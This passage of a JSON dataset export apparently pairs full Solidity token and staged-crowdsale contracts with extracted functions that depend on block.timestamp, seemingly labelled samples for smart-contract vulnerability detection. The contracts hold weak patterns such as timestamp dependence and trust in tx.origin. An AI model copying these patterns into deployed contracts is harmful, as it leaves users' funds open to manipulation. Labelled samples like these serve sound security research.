to,\n uint256 value,\n bytes data,\n DelegateMode mode,\n uint8 v,\n bytes32 r,\n bytes32 s\n ) public returns (bool);\n function directDebit(address debtor, address receiver) public view returns (DirectDebit);\n function setupDirectDebit(address receiver, DirectDebitInfo info) public returns (bool);\n function terminateDirectDebit(address receiver) public returns (bool);\n function withdrawDirectDebit(address debtor) public returns (bool);\n function withdrawDirectDebit(address[] debtors, bool strict) public returns (bool);\n}\ncontract ERC20Like is SecureERC20, FsTKToken {\n using AddressExtension for address;\n using Math for uint256;\n modifier liquid {\n require(isLiquid);\n _;\n }\n modifier canUseDirectDebit {\n require(isDirectDebitEnable);\n _;\n }\n modifier canDelegate {\n require(isDelegateEnable);\n _;\n }\n bool public erc20ApproveChecking;\n bool public isLiquid = true;\n bool public isDelegateEnable;\n bool public isDirectDebitEnable;\n string public metadata;\n mapping(address => Account) internal accounts;\n constructor(string _metadata) public {\n metadata = _metadata;\n }\n function balanceOf(address owner) public view returns (uint256) {\n return accounts[owner].balance;\n }\n function allowance(address owner, address spender) public view returns (uint256) {\n return accounts[owner].instruments[spender].allowance;\n }\n function transfer(address to, uint256 value) public liquid returns (bool) {\n Account storage senderAccount = accounts[msg.sender];\n senderAccount.balance = senderAccount.balance.sub(value);\n accounts[to].balance += value;\n emit Transfer(msg.sender, to, value);\n return true;\n }\n function transferFrom(address from, address to, uint256 value) public liquid returns (bool) {\n Account storage fromAccount = accounts[from];\n Instrument storage senderInstrument = fromAccount.instruments[msg.sender];\n fromAccount.balance = fromAccount.balance.sub(value);\n senderInstrument.allowance = senderInstrument.allowance.sub(value);\n accounts[to].balance += value;\n emit Transfer(from, to, value);\n return true;\n }\n function approve(address spender, uint256 value) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n if (erc20ApproveChecking) {\n require((value == 0) || (spenderInstrument.allowance == 0));\n }\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = value\n );\n return true;\n }\n function setERC20ApproveChecking(bool approveChecking) public {\n emit SetERC20ApproveChecking(erc20ApproveChecking = approveChecking);\n }\n function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n require(spenderInstrument.allowance == expectedValue);\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = newValue\n );\n return true;\n }\n function increaseAllowance(address spender, uint256 value) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = spenderInstrument.allowance.add(value)\n );\n return true;\n }\n function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool) {\n Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];\n uint256 currentValue = spenderInstrument.allowance;\n uint256 newValue;\n if (strict) {\n newValue = currentValue.sub(value);\n } else if (value < currentValue) {\n newValue = currentValue - value;\n }\n emit Approval(\n msg.sender,\n spender,\n spenderInstrument.allowance = newValue\n );\n return true;\n }\n function setMetadata0(string _metadata) internal {\n emit SetMetadata(metadata = _metadata);\n }\n function setLiquid0(bool liquidity) internal {\n emit SetLiquid(isLiquid = liquidity);\n }\n function setDelegate(bool delegate) public {\n emit SetDelegate(isDelegateEnable = delegate);\n }\n function setDirectDebit(bool directDebit) public {\n emit SetDirectDebit(isDirectDebitEnable = directDebit);\n }\n function spendableAllowance(address owner, address spender) public view returns (uint256) {\n Account storage ownerAccount = accounts[owner];\n return Math.min(\n ownerAccount.instruments[spender].allowance,\n ownerAccount.balance\n );\n }\n function transfer(uint256[] data) public liquid returns (bool) {\n Account storage senderAccount = accounts[msg.sender];\n uint256 totalValue;\n for (uint256 i = 0; i < data.length; i++) {\n address receiver = address(data[i] >> 96);\n uint256 value = data[i] & 0xffffffffffffffffffffffff;\n totalValue = totalValue.add(value);\n accounts[receiver].balance += value;\n emit Transfer(msg.sender, receiver, value);\n }\n senderAccount.balance = senderAccount.balance.sub(totalValue);\n return true;\n }\n function transferAndCall(\n address to,\n uint256 value,\n bytes data\n )\n public\n payable\n liquid\n returns (bool)\n {\n require(\n to != address(this) &&\n data.length >= 68 &&\n transfer(to, value)\n );\n assembly {\n mstore(add(data, 36), value)\n mstore(add(data, 68), caller)\n }\n require(to.call.value(msg.value)(data));\n return true;\n }\n function nonceOf(address owner) public view returns (uint256) {\n return accounts[owner].nonce;\n }\n function increaseNonce() public returns (bool) {\n emit IncreaseNonce(msg.sender, accounts[msg.sender].nonce += 1);\n }\n function delegateTransferAndCall(\n uint256 nonce,\n uint256 fee,\n uint256 gasAmount,\n address to,\n uint256 value,\n bytes data,\n DelegateMode mode,\n uint8 v,\n bytes32 r,\n bytes32 s\n )\n public\n liquid\n canDelegate\n returns (bool)\n {\n require(to != address(this));\n address signer;\n address relayer;\n if (mode == DelegateMode.PublicMsgSender) {\n signer = ecrecover(\n keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, address(0))),\n v,\n r,\n s\n );\n relayer = msg.sender;\n } else if (mode == DelegateMode.PublicTxOrigin) {\n signer = ecrecover(\n keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, address(0))),\n v,\n r,\n s\n );\n relayer = tx.origin;\n } else if (mode == DelegateMode.PrivateMsgSender) {\n signer = ecrecover(\n keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, msg.sender)),\n v,\n r,\n s\n );\n relayer = msg.sender;\n } else if (mode == DelegateMode.PrivateTxOrigin) {\n signer = ecrecover(\n keccak256(abi.encodePacked(this, nonce, fee, gasAmount, to, value, data, mode, tx.origin)),\n v,\n r,\n s\n );\n relayer = tx.origin;\n } else {\n revert();\n }\n Account storage signerAccount = accounts[signer];\n require(nonce == signerAccount.nonce);\n emit IncreaseNonce(signer, signerAccount.nonce += 1);\n signerAccount.balance = signerAccount.balance.sub(value.add(fee));\n accounts[to].balance += value;\n if (fee != 0) {\n accounts[relayer].balance += fee;\n emit Transfer(signer, relayer, fee);\n }\n if (!to.isAccount() && data.length >= 68) {\n assembly {\n mstore(add(data, 36), value)\n mstore(add(data, 68), signer)\n }\n if (to.call.gas(gasAmount)(data)) {\n emit Transfer(signer, to, value);\n } else {\n signerAccount.balance += value;\n accounts[to].balance -= value;\n }\n } else {\n emit Transfer(signer, to, value);\n }\n return true;\n }\n function directDebit(address debtor, address receiver) public view returns (DirectDebit) {\n return accounts[debtor].instruments[receiver].directDebit;\n }\n function setupDirectDebit(\n address receiver,\n DirectDebitInfo info\n )\n public\n returns (bool)\n {\n accounts[msg.sender].instruments[receiver].directDebit = DirectDebit({\n info: info,\n epoch: 0\n });\n emit SetupDirectDebit(msg.sender, receiver, info);\n return true;\n }\n function terminateDirectDebit(address receiver) public returns (bool) {\n delete accounts[msg.sender].instruments[receiver].directDebit;\n emit TerminateDirectDebit(msg.sender, receiver);\n return true;\n }\n function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) {\n Account storage debtorAccount = accounts[debtor];\n DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\n uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\n uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\n require(amount > 0);\n debtorAccount.balance = debtorAccount.balance.sub(amount);\n accounts[msg.sender].balance += amount;\n debit.epoch = epoch;\n emit Transfer(debtor, msg.sender, amount);\n return true;\n }\n function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) {\n Account storage receiverAccount = accounts[msg.sender];\n result = true;\n uint256 total;\n for (uint256 i = 0; i < debtors.length; i++) {\n address debtor = debtors[i];\n Account storage debtorAccount = accounts[debtor];\n DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\n uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\n uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\n require(amount > 0);\n uint256 debtorBalance = debtorAccount.balance;\n if (amount > debtorBalance) {\n if (strict) {\n revert();\n }\n result = false;\n emit WithdrawDirectDebitFailure(debtor, msg.sender);\n } else {\n debtorAccount.balance = debtorBalance - amount;\n total += amount;\n debit.epoch = epoch;\n emit Transfer(debtor, msg.sender, amount);\n }\n }\n receiverAccount.balance += total;\n }\n}\ncontract SmartToken is Authorizable, IssuerContract, ERC20Like {\n string public name;\n string public symbol;\n uint256 public totalSupply;\n uint8 public constant decimals = 18;\n constructor(\n address _issuer,\n FsTKAuthority _fstkAuthority,\n string _name,\n string _symbol,\n uint256 _totalSupply,\n string _metadata\n )\n Authorizable(_fstkAuthority)\n IssuerContract(_issuer)\n ERC20Like(_metadata)\n public\n {\n name = _name;\n symbol = _symbol;\n totalSupply = _totalSupply;\n accounts[_issuer].balance = _totalSupply;\n emit Transfer(address(0), _issuer, _totalSupply);\n }\n function setERC20ApproveChecking(bool approveChecking) public onlyIssuer {\n super.setERC20ApproveChecking(approveChecking);\n }\n function setDelegate(bool delegate) public onlyIssuer {\n super.setDelegate(delegate);\n }\n function setDirectDebit(bool directDebit) public onlyIssuer {\n super.setDirectDebit(directDebit);\n }\n function setMetadata(\n string infoUrl,\n uint256 approveTime,\n bytes approveToken\n )\n public\n onlyIssuer\n onlyFsTKApproved(keccak256(abi.encodePacked(approveTime, this, msg.sig, infoUrl)), approveTime, approveToken)\n {\n setMetadata0(infoUrl);\n }\n function setLiquid(\n bool liquidity,\n uint256 approveTime,\n bytes approveToken\n )\n public\n onlyIssuer\n onlyFsTKApproved(keccak256(abi.encodePacked(approveTime, this, msg.sig, liquidity)), approveTime, approveToken)\n {\n setLiquid0(liquidity);\n }\n}",
  "extract_feature": [
    "function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) {\nAccount storage debtorAccount = accounts[debtor];\nDirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\nuint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\nuint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\nrequire(amount > 0);\ndebtorAccount.balance = debtorAccount.balance.sub(amount);\naccounts[msg.sender].balance += amount;\ndebit.epoch = epoch;\nemit Transfer(debtor, msg.sender, amount);\nreturn true;\n}",
    "function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) {\nAccount storage receiverAccount = accounts[msg.sender];\nresult = true;\nuint256 total;\nfor (uint256 i = 0; i < debtors.length; i++) {\naddress debtor = debtors[i];\nAccount storage debtorAccount = accounts[debtor];\nDirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;\nuint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);\nuint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);\nrequire(amount > 0);\nuint256 debtorBalance = debtorAccount.balance;\nif (amount > debtorBalance) {\nif (strict) {\nrevert();\n}\nresult = false;\nemit WithdrawDirectDebitFailure(debtor, msg.sender);\n} else {\ndebtorAccount.balance = debtorBalance - amount;\ntotal += amount;\ndebit.epoch = epoch;\nemit Transfer(debtor, msg.sender, amount);\n}\n}\nreceiverAccount.balance += total;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f02"
  },
  "filename": "6053.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(\n address indexed purchaser,\n address indexed beneficiary,\n uint256 value,\n uint256 amount\n );\n constructor(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_token != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n }\n function _deliverTokens(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n }\n function _getTokenAmount(uint256 _weiAmount)\n internal view returns (uint256)\n {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract TimedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public openingTime;\n uint256 public closingTime;\n modifier onlyWhileOpen {\n require(block.timestamp >= openingTime && block.timestamp <= closingTime);\n _;\n }\n constructor(uint256 _openingTime, uint256 _closingTime) public {\n require(_openingTime >= block.timestamp);\n require(_closingTime >= _openingTime);\n openingTime = _openingTime;\n closingTime = _closingTime;\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n onlyWhileOpen\n {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract FinalizableCrowdsale is TimedCrowdsale, Ownable {\n using SafeMath for uint256;\n bool public isFinalized = false;\n event Finalized();\n function finalize() onlyOwner public {\n require(!isFinalized);\n require(hasClosed());\n finalization();\n emit Finalized();\n isFinalized = true;\n }\n function finalization() internal {\n }\n}\ncontract StageCrowdsale is FinalizableCrowdsale {\n bool public previousStageIsFinalized = false;\n StageCrowdsale public previousStage;\n constructor(\n uint256 _rate,\n address _wallet,\n ERC20 _token,\n uint256 _openingTime,\n uint256 _closingTime,\n StageCrowdsale _previousStage\n )\n public\n Crowdsale(_rate, _wallet, _token)\n TimedCrowdsale(_openingTime, _closingTime)\n {\n previousStage = _previousStage;\n if (_previousStage == address(0)) {\n previousStageIsFinalized = true;\n }\n }\n modifier isNotFinalized() {\n require(!isFinalized, \"Call on finalized.\");\n _;\n }\n modifier previousIsFinalized() {\n require(isPreviousStageFinalized(), \"Call on previous stage finalized.\");\n _;\n }\n function finalizeStage() public onlyOwner isNotFinalized {\n _finalizeStage();\n }\n function proxyBuyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(tx.origin, _beneficiary, weiAmount, tokens);\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function isPreviousStageFinalized() public returns (bool) {\n if (previousStageIsFinalized) {\n return true;\n }\n if (previousStage.isFinalized()) {\n previousStageIsFinalized = true;\n }\n return previousStageIsFinalized;\n }\n function _finalizeStage() internal isNotFinalized {\n finalization();\n emit Finalized();\n isFinalized = true;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal isNotFinalized previousIsFinalized {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract MultiStageCrowdsale is Ownable {\n uint256 public currentStageIndex = 0;\n StageCrowdsale[] public stages;\n event StageAdded();\n function () external payable {\n buyTokens(msg.sender);\n }\n modifier hasCurrentStage() {\n require(currentStageIndex < stages.length);\n _;\n }\n modifier validBuyCall(address _beneficiary) {\n require(_beneficiary != address(0));\n require(msg.value != 0);\n _;\n }\n function addStageCrowdsale(address _stageCrowdsaleAddress) public onlyOwner {\n require(_stageCrowdsaleAddress != address(0));\n StageCrowdsale stageToBeAdded = StageCrowdsale(_stageCrowdsaleAddress);\n if (stages.length > 0) {\n require(stageToBeAdded.previousStage() != address(0));\n StageCrowdsale lastStage = stages[stages.length - 1];\n require(stageToBeAdded.openingTime() >= lastStage.closingTime());\n }\n stages.push(stageToBeAdded);\n emit StageAdded();\n }\n function buyTokens(address _beneficiary) public payable validBuyCall(_beneficiary) hasCurrentStage {\n StageCrowdsale stage = updateCurrentStage();\n stage.proxyBuyTokens.value(msg.value)(_beneficiary);\n updateCurrentStage();\n }\n function getCurrentStage() public view returns (StageCrowdsale) {\n if (stages.length > 0) {\n return stages[currentStageIndex];\n }\n }\n function updateCurrentStage() public returns (StageCrowdsale currentStage) {\n if (currentStageIndex < stages.length) {\n currentStage = stages[currentStageIndex];\n while (currentStage.isFinalized() && currentStageIndex + 1 < stages.length) {\n currentStage = stages[++currentStageIndex];\n }\n }\n }\n}",
  "extract_feature": [
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1f03"
  },
  "filename": "6054.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n event TokenPurchase(\n address indexed purchaser,\n address indexed beneficiary,\n uint256 value,\n uint256 amount\n );\n constructor(uint256 _rate, address _wallet, ERC20 _token) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_token != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _token;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(\n msg.sender,\n _beneficiary,\n weiAmount,\n tokens\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n }\n function _deliverTokens(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n token.transfer(_beneficiary, _tokenAmount);\n }\n function _processPurchase(\n address _beneficiary,\n uint256 _tokenAmount\n )\n internal\n {\n _deliverTokens(_beneficiary, _tokenAmount);\n }\n function _updatePurchasingState(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n }\n function _getTokenAmount(uint256 _weiAmount)\n internal view returns (uint256)\n {\n return _weiAmount.mul(rate);\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract TimedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public openingTime;\n uint256 public closingTime;\n modifier onlyWhileOpen {\n require(block.timestamp >= openingTime && block.timestamp <= closingTime);\n _;\n }\n constructor(uint256 _openingTime, uint256 _closingTime) public {\n require(_openingTime >= block.timestamp);\n require(_closingTime >= _openingTime);\n openingTime = _openingTime;\n closingTime = _closingTime;\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n onlyWhileOpen\n {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract FinalizableCrowdsale is TimedCrowdsale, Ownable {\n using SafeMath for uint256;\n bool public isFinalized = false;\n event Finalized();\n function finalize() onlyOwner public {\n require(!isFinalized);\n require(hasClosed());\n finalization();\n emit Finalized();\n isFinalized = true;\n }\n function finalization() internal {\n }\n}\ncontract StageCrowdsale is FinalizableCrowdsale {\n bool public previousStageIsFinalized = false;\n StageCrowdsale public previousStage;\n constructor(\n uint256 _rate,\n address _wallet,\n ERC20 _token,\n uint256 _openingTime,\n uint256 _closingTime,\n StageCrowdsale _previousStage\n )\n public\n Crowdsale(_rate, _wallet, _token)\n TimedCrowdsale(_openingTime, _closingTime)\n {\n previousStage = _previousStage;\n if (_previousStage == address(0)) {\n previousStageIsFinalized = true;\n }\n }\n modifier isNotFinalized() {\n require(!isFinalized, \"Call on finalized.\");\n _;\n }\n modifier previousIsFinalized() {\n require(isPreviousStageFinalized(), \"Call on previous stage finalized.\");\n _;\n }\n function finalizeStage() public onlyOwner isNotFinalized {\n _finalizeStage();\n }\n function proxyBuyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n uint256 tokens = _getTokenAmount(weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchase(_beneficiary, tokens);\n emit TokenPurchase(tx.origin, _beneficiary, weiAmount, tokens);\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function isPreviousStageFinalized() public returns (bool) {\n if (previousStageIsFinalized) {\n return true;\n }\n if (previousStage.isFinalized()) {\n previousStageIsFinalized = true;\n }\n return previousStageIsFinalized;\n }\n function _finalizeStage() internal isNotFinalized {\n finalization();\n emit Finalized();\n isFinalized = true;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal isNotFinalized previousIsFinalized {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract CappedCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public cap;\n constructor(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function capReached() public view returns (bool) {\n return weiRaised >= cap;\n }\n function _preValidatePurchase(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n require(weiRaised.add(_weiAmount) <= cap);\n }\n}\ncontract CappedStageCrowdsale is CappedCrowdsale, StageCrowdsale {\n using SafeMath for uint256;\n function weiToCap() public view returns (uint256) {\n return cap.sub(weiRaised);\n }\n function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n super._postValidatePurchase(_beneficiary, _weiAmount);\n if (weiRaised >= cap) {\n _finalizeStage();\n }\n }\n}\ncontract LimitedMinPurchaseCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public minPurchase;\n constructor(uint256 _minPurchase) public {\n require(\n _minPurchase > 0,\n \"Call with insufficient _minPurchase.\"\n );\n minPurchase = _minPurchase;\n }\n modifier overMinPurchaseLimit(uint256 _weiAmount) {\n require(\n _weiAmount >= minPurchase,\n \"Call with insufficient _weiAmount.\"\n );\n _;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal overMinPurchaseLimit(_weiAmount) {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract TokensSoldCountingCrowdsale is Crowdsale {\n using SafeMath for uint256;\n uint256 public tokensSoldCount;\n function _updatePurchasingState(\n address _beneficiary,\n uint256 _weiAmount\n )\n internal\n {\n uint256 tokens = _getTokenAmount(_weiAmount);\n tokensSoldCount = tokensSoldCount.add(tokens);\n }\n}\ncontract ManualTokenDistributionCrowdsale is Crowdsale, Ownable, TokensSoldCountingCrowdsale {\n using SafeMath for uint256;\n event TokenAssignment(address indexed beneficiary, uint256 amount);\n function manualSendTokens(address _beneficiary, uint256 _tokensAmount) public onlyOwner {\n require(_beneficiary != address(0));\n require(_tokensAmount > 0);\n super._deliverTokens(_beneficiary, _tokensAmount);\n tokensSoldCount = tokensSoldCount.add(_tokensAmount);\n emit TokenAssignment(_beneficiary, _tokensAmount);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\ncontract PausableCrowdsale is Crowdsale, Pausable {\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal whenNotPaused {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract RefundVault is Ownable {\n using SafeMath for uint256;\n enum State { Active, Refunding, Closed }\n mapping (address => uint256) public deposited;\n address public wallet;\n State public state;\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed beneficiary, uint256 weiAmount);\n constructor(address _wallet) public {\n require(_wallet != address(0));\n wallet = _wallet;\n state = State.Active;\n }\n function deposit(address investor) onlyOwner public payable {\n require(state == State.Active);\n deposited[investor] = deposited[investor].add(msg.value);\n }\n function close() onlyOwner public {\n require(state == State.Active);\n state = State.Closed;\n emit Closed();\n wallet.transfer(address(this).balance);\n }\n function enableRefunds() onlyOwner public {\n require(state == State.Active);\n state = State.Refunding;\n emit RefundsEnabled();\n }\n function refund(address investor) public {\n require(state == State.Refunding);\n uint256 depositedValue = deposited[investor];\n deposited[investor] = 0;\n investor.transfer(depositedValue);\n emit Refunded(investor, depositedValue);\n }\n}\ncontract RefundableCrowdsale is FinalizableCrowdsale {\n using SafeMath for uint256;\n uint256 public goal;\n RefundVault public vault;\n constructor(uint256 _goal) public {\n require(_goal > 0);\n vault = new RefundVault(wallet);\n goal = _goal;\n }\n function claimRefund() public {\n require(isFinalized);\n require(!goalReached());\n vault.refund(msg.sender);\n }\n function goalReached() public view returns (bool) {\n return weiRaised >= goal;\n }\n function finalization() internal {\n if (goalReached()) {\n vault.close();\n } else {\n vault.enableRefunds();\n }\n super.finalization();\n }\n function _forwardFunds() internal {\n vault.deposit.value(msg.value)(msg.sender);\n }\n}\ncontract RefundableStageCrowdsale is RefundableCrowdsale {\n function _forwardFunds() internal {\n vault.deposit.value(msg.value)(tx.origin);\n }\n}\nlibrary Roles {\n struct Role {\n mapping (address => bool) bearer;\n }\n function add(Role storage role, address addr)\n internal\n {\n role.bearer[addr] = true;\n }\n function remove(Role storage role, address addr)\n internal\n {\n role.bearer[addr] = false;\n }\n function check(Role storage role, address addr)\n view\n internal\n {\n require(has(role, addr));\n }\n function has(Role storage role, address addr)\n view\n internal\n returns (bool)\n {\n return role.bearer[addr];\n }\n}\ncontract RBAC {\n using Roles for Roles.Role;\n mapping (string => Roles.Role) private roles;\n event RoleAdded(address addr, string roleName);\n event RoleRemoved(address addr, string roleName);\n function checkRole(address addr, string 